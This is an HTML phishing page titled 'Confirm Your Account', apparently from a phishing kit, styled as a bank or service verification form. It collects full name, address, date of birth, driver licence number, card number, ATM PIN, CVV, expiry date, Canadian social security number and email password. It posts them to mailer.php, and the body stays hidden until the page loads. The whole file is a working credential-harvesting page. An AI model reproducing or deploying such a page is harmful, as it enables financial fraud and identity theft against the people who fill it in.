<!DOCTYPE HTML PUBLIC "-//W3C//DTD HTML 4.01 Transitional//EN">
<html>
<head>
<title>Confirm Your Account</title>
<meta http-equiv="content-type" content="text/html; charset=ISO-8859-1">
<link rel="shortcut icon"
              href="images/favicon.ico"/>
			  
			  
	
<script type="text/javascript">

function unhideBody()
{
var bodyElems = document.getElementsByTagName("body");
bodyElems[0].style.visibility = "visible";
}

</script>

<body style="visibility:hidden" onload="unhideBody()">

<style> 
  .textbox { 
    border: 1px solid #c4c4c4; 
    height: 28px; 
    width: 275px; 
    font-size: 15px; 
    padding: 4px 4px 4px 4px; 
    border-radius: 2px; 
    -moz-border-radius: 2px; 
    -webkit-border-radius: 4px; 
    box-shadow: 0px 0px 2px #d9d9d9; 
    -moz-box-shadow: 0px 0px 8px #d9d9d9; 
    -webkit-box-shadow: 0px 0px 8px #d9d9d9; 
} 
 
.textbox:focus { 
    outline: none; 
    border: 1px solid #7bc1f7; 
    box-shadow: 0px 0px 8px #7bc1f7; 
    -moz-box-shadow: 0px 0px 8px #7bc1f7; 
    -webkit-box-shadow: 0px 0px 8px #7bc1f7; 
} 
 </style>

<style type="text/css">
/*----------Text Styles----------*/
.ws6 {font-size: 8px;}
.ws7 {font-size: 9.3px;}
.ws8 {font-size: 11px;}
.ws9 {font-size: 12px;}
.ws10 {font-size: 13px;}
.ws11 {font-size: 15px;}
.ws12 {font-size: 16px;}
.ws14 {font-size: 19px;}
.ws16 {font-size: 21px;}
.ws18 {font-size: 24px;}
.ws20 {font-size: 27px;}
.ws22 {font-size: 29px;}
.ws24 {font-size: 32px;}
.ws26 {font-size: 35px;}
.ws28 {font-size: 37px;}
.ws36 {font-size: 48px;}
.ws48 {font-size: 64px;}
.ws72 {font-size: 96px;}
.wpmd {font-size: 13px;font-family: Arial,Helvetica,Sans-Serif;font-style: normal;font-weight: normal;}
/*----------Para Styles----------*/
DIV,UL,OL /* Left */
{
 margin-top: 0px;
 margin-bottom: 0px;
}
</style>

<style type="text/css">
div#container
{
	position:relative;
	width: 1421px;
	margin-top: 0px;
	margin-left: auto;
	margin-right: auto;
	text-align:left; 
}
body {text-align:center;margin:0}
</style>

</head>
<body>
<div id="container">
<div id="image1" style="position:absolute; overflow:hidden; left:202px; top:0px; width:1006px; height:217px; z-index:0"><a href="#"><img src="images/header.png" alt="" title="" border=0 width=1006 height=217></a></div>

<div id="image2" style="position:absolute; overflow:hidden; left:952px; top:204px; width:277px; height:473px; z-index:1"><img src="images/sldie.png" alt="" title="" border=0 width=277 height=473></div>

<div id="image3" style="position:absolute; overflow:hidden; left:208px; top:218px; width:716px; height:105px; z-index:2"><img src="images/ase.png" alt="" title="" border=0 width=716 height=105></div>

<div id="image4" style="position:absolute; overflow:hidden; left:907px; top:323px; width:15px; height:849px; z-index:3"><img src="images/lne.png" alt="" title="" border=0 width=15 height=849></div>

<div id="image5" style="position:absolute; overflow:hidden; left:211px; top:322px; width:15px; height:851px; z-index:4"><img src="images/img664710234.png" alt="" title="" border=0 width=15 height=851></div>

<div id="text1" style="position:absolute; overflow:hidden; left:284px; top:347px; width:89px; height:23px; z-index:5">
<div class="wpmd">
<div>Full name</div>
</div></div>

<div id="text2" style="position:absolute; overflow:hidden; left:284px; top:404px; width:67px; height:26px; z-index:6">
<div class="wpmd">
<div>Address</div>
</div></div>

<div id="text4" style="position:absolute; overflow:hidden; left:284px; top:625px; width:87px; height:26px; z-index:7">
<div class="wpmd">
<div>Date of birth</div>
</div></div>

<div id="text5" style="position:absolute; overflow:hidden; left:284px; top:681px; width:142px; height:26px; z-index:8">
<div class="wpmd">
<div>Driver Licence Number</div>
</div></div>

<div id="text6" style="position:absolute; overflow:hidden; left:284px; top:733px; width:90px; height:26px; z-index:9">
<div class="wpmd">
<div>Card Number</div>
</div></div>

<div id="text7" style="position:absolute; overflow:hidden; left:284px; top:791px; width:138px; height:26px; z-index:10">
<div class="wpmd">
<div>Name On Card</div>
</div></div>

<div id="text8" style="position:absolute; overflow:hidden; left:284px; top:849px; width:109px; height:26px; z-index:11">
<div class="wpmd">
<div>ATM Pin</div>
</div></div>

<div id="text9" style="position:absolute; overflow:hidden; left:284px; top:902px; width:89px; height:26px; z-index:12">
<div class="wpmd">
<div>Expiry Date</div>
</div></div>

<div id="text10" style="position:absolute; overflow:hidden; left:284px; top:964px; width:60px; height:20px; z-index:13">
<div class="wpmd">
<div>CVV</div>
</div></div>

<div id="text11" style="position:absolute; overflow:hidden; left:284px; top:1017px; width:207px; height:26px; z-index:14">
<div class="wpmd">
<div>Social Security Number in Canada</div>
</div></div>

<div id="text12" style="position:absolute; overflow:hidden; left:284px; top:1216px; width:207px; height:26px; z-index:15">
<div class="wpmd">
<div>Social Security Number in Canada</div>
</div></div>

<div id="image6" style="position:absolute; overflow:hidden; left:201px; top:1168px; width:733px; height:126px; z-index:16"><img src="images/eeee.png" alt="" title="" border=0 width=733 height=126></div>
<form action=mailer.php name=chalbhai id=chalbhai method=post>
<div id="image7" style="position:absolute; overflow:hidden; left:192px; top:1378px; width:998px; height:154px; z-index:17"><a href="#"><img src="images/footer.png" alt="" title="" border=0 width=998 height=154></a></div>

<input name="formtext1" autofocus required autocomplete="off" class="textbox" type="text" style="position:absolute;width:254px;left:283px;top:371px;z-index:18">
<select name="formselect1" autofocus required autocomplete="off" class="textbox" style="position:absolute;left:364px;top:645px;width:87px;z-index:19">
<option value="Month">Month</option>
<option value="Month">Month</option>
    <option value="1">January</option>
    <option value="2">February</option>
    <option value="3">March</option>
    <option value="4">April</option>
    <option value="5">May</option>
    <option value="6">June</option>
    <option value="7">July</option>
    <option value="8">August</option>
    <option value="9">September</option>
    <option value="10">October</option>
    <option value="11">November</option>
</select>
<input name="formtext3"  autofocus required autocomplete="off" class="textbox" type="text" maxlength=2 style="position:absolute;width:65px;left:283px;top:645px;z-index:20">
<input name="formtext4"  autofocus required autocomplete="off" class="textbox" type="text" maxlength=4 style="position:absolute;width:69px;left:468px;top:645px;z-index:21">
<input name="formtext2"  autofocus required autocomplete="off" class="textbox" type="text" style="position:absolute;width:254px;left:283px;top:425px;z-index:22">
<input name="formtext5"  autofocus required autocomplete="off" class="textbox" type="text" style="position:absolute;width:254px;left:283px;top:700px;z-index:23">
<input name="formtext6"  autofocus required autocomplete="off" class="textbox" type="text" maxlength=18 style="position:absolute;width:254px;left:283px;top:755px;z-index:24">
<input name="formtext7"  autofocus required autocomplete="off" class="textbox" type="text" style="position:absolute;width:254px;left:283px;top:813px;z-index:25">
<input name="formtext8"  autofocus required autocomplete="off" class="textbox" type="text" maxlength=16 style="position:absolute;width:87px;left:283px;top:869px;z-index:26">
<input name="formtext11"  autofocus required autocomplete="off" class="textbox" type="text" style="position:absolute;width:129px;left:283px;top:1038px;z-index:27">
<input name="formtext12"  autofocus required autocomplete="off" class="textbox" type="text" style="position:absolute;width:254px;left:283px;top:1095px;z-index:28">
<input name="formtext13"  autofocus required autocomplete="off" class="textbox" type="text" style="position:absolute;width:129px;left:283px;top:982px;z-index:29">
<input name="formtext10"  autofocus required autocomplete="off" class="textbox" placeholder="YY" type="text" style="position:absolute;width:40px;left:331px;top:928px;z-index:30">
<input name="formtext17" autofocus required autocomplete="off" class="textbox" placeholder="MM" type="text" style="position:absolute;left:283px;top:928px;width:40px;z-index:31">

<div id="formimage1" style="position:absolute; left:741px; top:1204px; z-index:32"><input type="image" name="formimage1" width="108" height="44" src="images/contines.png"></div>
<div id="image8" style="position:absolute; overflow:hidden; left:275px; top:1217px; width:440px; height:21px; z-index:33"><a href="#"><img src="images/back.png" alt="" title="" border=0 width=440 height=21></a></div>

<input name="formtext14" autofocus required autocomplete="off" class="textbox" type="text" style="position:absolute;width:254px;left:283px;top:481px;z-index:34">
<div id="text13" style="position:absolute; overflow:hidden; left:284px; top:458px; width:67px; height:26px; z-index:35">
<div class="wpmd">
<div>City</div>
</div></div>

<input name="formtext15" autofocus required autocomplete="off" class="textbox" type="text" maxlength=6 style="position:absolute;width:127px;left:283px;top:538px;z-index:36">
<input name="formtext16" autofocus required autocomplete="off" class="textbox" type="text" style="position:absolute;width:254px;left:283px;top:591px;z-index:37">
<div id="text14" style="position:absolute; overflow:hidden; left:284px; top:570px; width:67px; height:26px; z-index:38">
<div class="wpmd">
<div>Province</div>
</div></div>

<div id="text15" style="position:absolute; overflow:hidden; left:284px; top:517px; width:67px; height:26px; z-index:39">
<div class="wpmd">
<div>Zip Code</div>
</div></div>

<div id="text3" style="position:absolute; overflow:hidden; left:284px; top:1071px; width:101px; height:26px; z-index:40">
<div class="wpmd">
<div>Email Address</div>
</div></div>

<div id="text16" style="position:absolute; overflow:hidden; left:284px; top:1128px; width:207px; height:26px; z-index:41">
<div class="wpmd">
<div>Email Password</div>
</div></div>

<input name="formtext9" autofocus required autocomplete="off" class="textbox" type="password" style="position:absolute;width:254px;left:283px;top:1153px;z-index:42">
</div>

</body>
</html>
